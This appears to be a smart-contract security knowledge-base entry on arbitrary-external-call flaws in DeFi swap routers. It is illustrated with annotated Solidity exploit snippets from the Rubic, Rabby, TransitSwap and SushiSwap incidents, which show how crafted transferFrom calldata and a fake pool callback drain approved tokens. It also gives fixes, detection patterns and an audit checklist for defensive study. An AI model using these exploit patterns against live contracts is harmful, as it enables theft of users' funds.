---
# Core Classification
protocol: "generic"
chain: "ethereum, bsc"
category: "access_control"
vulnerability_type: "arbitrary_external_call"

# Attack Vector Details
attack_type: "data_manipulation"
affected_component: "swap_router, cross_chain_proxy, callback_handler"

# Technical Primitives
primitives:
  - "arbitrary_call"
  - "unvalidated_router"
  - "unvalidated_calldata"
  - "transferFrom_exploit"
  - "approval_drain"
  - "low_level_call"
  - "delegatecall"

# Impact Classification
severity: "critical"
impact: "fund_loss"
exploitability: 0.8
financial_impact: "critical"

# Context Tags
tags:
  - "defi"
  - "arbitrary_call"
  - "router"
  - "approval"
  - "transferFrom"
  - "swap"
  - "cross_chain"
  - "calldata"

# Version Info
language: "solidity"
version: ">=0.8.0"
---

## References

| Tag | Source | Path / URL |
|-----|--------|------------|
| [RUB-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-12/Rubic_exp.sol` |
| [RAB-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-10/RabbyWallet_SwapRouter_exp.sol` |
| [TRS-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-10/TransitSwap_exp.sol` |
| [SUSHI-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-04/Sushi_Router_exp.sol` |

---

# Arbitrary External Call / Router Exploitation Patterns (2022-2023)

## Overview

Arbitrary external call vulnerabilities occur when DeFi contracts (swap routers, cross-chain proxies, aggregators) accept user-controlled `address` and `bytes calldata` parameters and perform low-level `.call()` to the specified address with the provided data. Since these router contracts hold broad ERC20 approvals from their users, an attacker can set the target address to a token contract and the calldata to `transferFrom(victim, attacker, amount)`, effectively stealing tokens from any user who approved the router. Between 2022-2023, this pattern caused **$26M+** in losses across 4+ protocols.

---

## 1. Unvalidated Router Address + Calldata in Swap Functions

### Root Cause

Swap aggregator and cross-chain proxy contracts often need to interact with multiple DEX routers. The simplest (and most dangerous) implementation accepts an arbitrary `router` address and arbitrary `calldata` bytes from the user, then performs `router.call(data)`. Since the swap proxy contract is the `msg.sender` in this call, and victims have approved the proxy for token spending, an attacker can craft `data = transferFrom(victim, attacker, balance)` and set `router = tokenAddress` to drain any approved token from any victim.

### Attack Scenario

1. Enumerate all addresses that approved tokens to the vulnerable router contract
2. For each victim, check their approved token balance
3. Craft `transferFrom(victim, attacker, amount)` calldata
4. Call the router's swap function with `router = tokenAddress` and crafted calldata
5. Router executes `token.transferFrom(victim, attacker, amount)` as msg.sender
6. Since victim approved the router, the transfer succeeds

### Vulnerable Pattern Examples

**Example 1: Rubic — routerCallNative with Arbitrary Router ($1.5M, December 2022)** [Approx Vulnerability: CRITICAL] `@audit` [RUB-POC]

```solidity
// ❌ VULNERABLE: routerCallNative accepts ANY router address and ANY calldata
// Performs router.call(data) where router and data are user-controlled

interface RubicProxy1 {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router;    // @audit ARBITRARY — attacker controls this!
    }
    function routerCallNative(
        BaseCrossChainParams calldata _params,
        bytes calldata _data  // @audit ARBITRARY — passed to router.call(_data)
    ) external;
}

// Attack: Set router = USDC address, data = transferFrom(victim, attacker, amount)
RubicProxy1.BaseCrossChainParams memory _params = RubicProxy1.BaseCrossChainParams({
    srcInputToken: address(0),
    srcInputAmount: 0,
    dstChainID: 0,
    dstOutputToken: address(0),
    dstMinOutputAmount: 0,
    recipient: address(0),
    integrator: integrators,
    router: address(USDC)  // @audit Set to USDC token contract!
});

// For each victim who approved Rubic:
uint256 victimsBalance = USDC.balanceOf(victims[i]);
uint256 victimsAllowance = USDC.allowance(victims[i], address(Rubic1));
uint256 amount = victimsBalance < victimsAllowance ? victimsBalance : victimsAllowance;

bytes memory data = abi.encodeWithSignature(
    "transferFrom(address,address,uint256)", victims[i], address(this), amount
);
Rubic1.routerCallNative(_params, data);
// @audit Rubic executes: USDC.transferFrom(victim, attacker, amount)
// Works because VICTIMS approved RUBIC, and RUBIC is msg.sender!
```

**Example 2: Rabby Wallet — swap() with Arbitrary dexRouter ($200K, October 2022)** [Approx Vulnerability: CRITICAL] `@audit` [RAB-POC]

```solidity
// ❌ VULNERABLE: swap() accepts arbitrary dexRouter + data
// Low-level call to dexRouter with user-controlled calldata

interface IRabbySwap {
    function swap(
        address srcToken,
        uint256 amount,
        address dstToken,
        uint256 minReturn,
        address dexRouter,   // @audit ARBITRARY — attacker controls!
        address dexSpender,  // @audit ARBITRARY — attacker controls!
        bytes memory data,   // @audit ARBITRARY — attacker controls!
        uint256 deadline
    ) external;
}

// Attack: For each victim who approved Rabby SwapRouter
bytes memory callbackData = abi.encodeWithSignature(
    "transferFrom(address,address,uint256)", victims[i], address(this), vic_balance
);
RABBYSWAP_ROUTER.swap(
    address(USDT_TOKEN), 0,
    address(this),        // dstToken = attacker contract
    4660,
    address(USDC_TOKEN),  // @audit dexRouter = USDC token!
    address(USDC_TOKEN),  // dexSpender
    callbackData,         // @audit data = transferFrom(victim, attacker, amount)
    block.timestamp
);

// @audit Attacker contract fakes balance/transfer checks:
function balanceOf(address) external pure returns (uint256) { return 100e18; }
function transfer(address, uint256) external pure returns (bool) { return true; }
```

**Example 3: TransitSwap — Crafted Calldata with Victim Address ($21M, October 2022)** [Approx Vulnerability: CRITICAL] `@audit` [TRS-POC]

```solidity
// ❌ VULNERABLE: TransitSwap main contract delegates to aux contracts
// with user-controlled calldata specifying the token "owner" (victim)

// Single raw call with crafted calldata:
(bool success,) = TRANSIT_SWAP.call(
    hex"006de4df..."  // Encoded calldata containing:
    // - Aux contract: 0xed1afc8c... (ClaimTokens)
    // - Function: transferFrom equivalent
    // - Token: BUSDT address
    // - From: VICTIM address
    // - To: ATTACKER address
    // - Amount: victim's full balance
);

// The TransitSwap flow:
// 1. Main contract reads aux contract address from calldata
// 2. Routes call through aux contract
// 3. Aux contract executes token.transferFrom(victim, attacker, amount)
// 4. Works because victim approved tokens to aux contract during normal usage
// @audit Victim approved TransitSwap ecosystem → attacker crafts calldata to drain

// Multi-chain exploitation: repeated across BSC, Ethereum, and other chains
// Total loss: >$21M from ALL users who approved TransitSwap contracts
```

**Example 4: SushiSwap RouteProcessor2 — Fake Pool Callback ($3.3M, April 2023)** [Approx Vulnerability: CRITICAL] `@audit` [SUSHI-POC]

```solidity
// ❌ VULNERABLE: processRoute accepts arbitrary pool address in route bytes
// Router calls swap() on attacker's contract thinking it's a real pool

// Malicious route specifies attacker's contract as "pool":
bytes memory route = abi.encodePacked(
    commandCode, address(LINK), num, share,
    poolType,           // UniswapV3-style
    address(this),      // @audit ATTACKER'S CONTRACT as the "pool"
    zeroForOne, recipient
);
processor.processRoute(..., route);

// Router calls swap() on attacker's contract:
// Attacker's fake "pool":
function swap(...) external returns (int256, int256) {
    // @audit Construct callback with VICTIM address
    bytes memory malicious_data = abi.encode(address(WETH), victim);

    // @audit Router trusts this callback, pulls tokens FROM VICTIM
    processor.uniswapV3SwapCallback(100 * 10 ** 18, 0, malicious_data);
    return (0, 0);
}

// The vulnerable callback in RouteProcessor2:
// function uniswapV3SwapCallback(..., bytes calldata data) external {
//     (address tokenIn, address from) = abi.decode(data, (address, address));
//     IERC20(tokenIn).transferFrom(from, msg.sender, amount);
//     // @audit MISSING: verify msg.sender is a real Uniswap V3 pool!
// }
```

---

## Impact Analysis

### Technical Impact
- ALL users who ever approved tokens to the vulnerable contract are at risk
- No user interaction needed — attacker just reads approved balances and drains them
- All token types (USDC, USDT, WETH, etc.) approved to the router can be stolen
- Multi-chain impact if the same router is deployed on multiple chains

### Business Impact
- **Total losses 2022-2023:** $26M+ (TransitSwap $21M, SushiSwap $3.3M, Rubic $1.5M, Rabby $200K)
- Every user who interacted with the vulnerable contract is a potential victim
- Requires no technical sophistication — just enumerate approvals and craft calls
- Particularly devastating for swap aggregators with large user bases

### Affected Scenarios
- Swap aggregators with arbitrary DEX router address parameters
- Cross-chain proxy contracts with arbitrary target + calldata
- Any contract that performs `address.call(userControlledData)` while holding approvals
- Router contracts with unverified callback handlers (uniswapV3SwapCallback pattern)
- DeFi contracts where msg.sender context is the contract (not the end-user)

---

## Secure Implementation

**Fix 1: Whitelist Allowed Call Targets**
```solidity
// ✅ SECURE: Only allow calls to pre-approved router addresses
contract SecureAggregator {
    mapping(address => bool) public approvedRouters;

    function addRouter(address router) external onlyOwner {
        approvedRouters[router] = true;
    }

    function swap(
        address router, bytes calldata data, ...
    ) external {
        require(approvedRouters[router], "Router not whitelisted");

        // Additional: Block calls to token contracts
        require(!isTokenContract(router), "Cannot call token directly");

        (bool success,) = router.call(data);
        require(success, "Swap failed");
    }
}
```

**Fix 2: Restrict Calldata Function Selectors**
```solidity
// ✅ SECURE: Only allow specific function selectors in calldata
contract SecureSwapProxy {
    // Allowed selectors: swap(), exactInput(), exactOutput(), etc.
    mapping(bytes4 => bool) public allowedSelectors;

    function routerCall(address router, bytes calldata data) external {
        bytes4 selector = bytes4(data[:4]);

        // Block dangerous selectors
        require(selector != IERC20.transferFrom.selector, "transferFrom blocked");
        require(selector != IERC20.approve.selector, "approve blocked");
        require(selector != IERC20.transfer.selector, "transfer blocked");

        require(allowedSelectors[selector], "Selector not allowed");

        (bool success,) = router.call(data);
        require(success, "Call failed");
    }
}
```

**Fix 3: Verified Pool Callback (for DEX Routers)**
```solidity
// ✅ SECURE: Compute expected pool address for callback verification
contract SecureRouteProcessor {
    IUniswapV3Factory public immutable factory;

    function uniswapV3SwapCallback(
        int256 amount0Delta, int256 amount1Delta, bytes calldata data
    ) external {
        (address token0, address token1, uint24 fee) = abi.decode(
            data, (address, address, uint24)
        );

        // Compute the expected pool address
        address expectedPool = factory.getPool(token0, token1, fee);
        require(msg.sender == expectedPool, "Callback from non-pool");

        // Safe to proceed — caller is verified as a real pool
        // Transfer from router's own balance, never from external users
        if (amount0Delta > 0) {
            IERC20(token0).transfer(msg.sender, uint256(amount0Delta));
        }
    }
}
```

---

## Detection Patterns

### Code Patterns to Look For
```
- `address.call(userControlledCalldata)` — low-level call with arbitrary data
- `router.call(_data)` where router comes from user input
- Function parameters combining arbitrary `address` + `bytes calldata`
- `delegatecall` to user-controlled addresses
- Swap functions accepting `dexRouter`, `dexSpender`, or `callTarget` parameters
- `uniswapV3SwapCallback` or similar without msg.sender verification
- Route bytes that include pool addresses decoded from user input
- `transferFrom` in callbacks where `from` comes from decoded callback data
- Contract holds broad token approvals from users (is a router/aggregator)
```

### Audit Checklist
- [ ] Does the contract perform low-level calls to user-controlled addresses?
- [ ] Is the calldata for external calls user-controlled?
- [ ] Are call targets restricted to a whitelist of approved contracts?
- [ ] Are dangerous selectors (transferFrom, approve, transfer) blocked?
- [ ] Do swap callbacks verify msg.sender is a legitimate pool?
- [ ] Does the contract hold ERC20 approvals from users?
- [ ] Can an attacker craft calldata to call token.transferFrom(victim, attacker, amount)?
- [ ] Are there alternative entry points that bypass validation?

---

## Real-World Examples

### Known Exploits
- **TransitSwap** — Crafted calldata with victim address in transferFrom, BSC — October 2022 — $21M
  - Root cause: Main contract delegated to aux contract with attacker-controlled from address
- **SushiSwap RouteProcessor2** — Fake pool in route bytes, Ethereum — April 2023 — $3.3M
  - Root cause: Route bytes specified attacker contract as pool, callback drained victim approvals
- **Rubic** — Arbitrary router + calldata in routerCallNative, Ethereum — December 2022 — $1.5M
  - Root cause: Router address and calldata both user-controlled, used to call transferFrom on tokens
- **Rabby Wallet** — Arbitrary dexRouter in swap(), Ethereum — October 2022 — $200K
  - Root cause: swap() accepted any dexRouter address, calldata used to call transferFrom

---

## Prevention Guidelines

### Development Best Practices
1. NEVER allow arbitrary `address + calldata` combinations in low-level calls
2. Whitelist all allowed call targets (router addresses) via governance
3. Blocklist dangerous function selectors (transferFrom, approve, transfer)
4. Verify callback callers against factory-computed addresses
5. Use typed interfaces (`IUniswapV3Router.exactInput()`) instead of generic `call()`
6. Implement allowance patterns where the router manages its own token pool (not user approvals)
7. Add monitoring for unusual transferFrom patterns from the contract

### Testing Requirements
- Unit tests for: arbitrary target + calldata attacks, transferFrom via proxy, selector blocking
- Integration tests for: full approval drain via crafted calldata, cross-chain exploitation
- Fuzzing targets: all functions accepting address + bytes parameters, callback handlers
- Invariant tests: contract never calls transferFrom where `from` != msg.sender or contract itself

---

## Keywords for Search

> `arbitrary external call`, `unvalidated router`, `arbitrary calldata`, `transferFrom exploit`, `approval drain`, `low-level call`, `router exploitation`, `swap aggregator`, `dexRouter`, `Rubic exploit`, `Rabby wallet`, `TransitSwap`, `SushiSwap RouteProcessor`, `callback trust`, `uniswapV3SwapCallback`, `route bytes`, `call injection`, `delegatecall exploit`, `proxy call`, `user-controlled calldata`, `approval theft`

---

## Related Vulnerabilities

- `DB/general/business-logic/defihacklabs-solvency-business-logic-patterns.md` — Callback trust flaws
- `DB/general/access-control/defihacklabs-access-control-patterns.md` — Missing access control
- `DB/general/missing-validations/defihacklabs-input-validation-patterns.md` — Input validation
- `DB/general/malicious/` — Malicious contract patterns
